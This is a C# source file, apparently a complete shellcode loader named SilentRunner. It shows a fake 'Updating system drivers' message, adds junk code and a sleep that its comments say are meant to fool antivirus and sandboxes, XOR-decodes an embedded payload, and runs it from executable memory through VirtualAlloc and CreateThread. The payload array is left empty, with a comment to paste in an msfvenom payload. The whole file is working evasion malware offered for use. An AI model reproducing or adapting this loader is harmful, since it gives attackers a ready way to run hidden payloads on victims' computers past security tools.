using System;
using System.Runtime.InteropServices;

namespace SilentRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            // Junk code to confuse AV heuristics
            DateTime now = DateTime.Now;
            string decoy = "Updating system drivers...";
            Console.WriteLine(decoy);

            // Sleep to evade sandboxing
            System.Threading.Thread.Sleep(3000);

            // XOR-encoded shellcode (replace with your msfvenom payload)
            byte[] encrypted = new byte[452] {
                /* PASTE YOUR XOR-ENCODED PAYLOAD HERE */
            };

            // Decode shellcode
            for (int i = 0; i < encrypted.Length; i++)
            {
                encrypted[i] ^= 0xAA; // XOR with same key
            }

            // Allocate RWX memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)encrypted.Length, 0x3000, 0x40);
            Marshal.Copy(encrypted, 0, addr, encrypted.Length);

            // Execute
            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
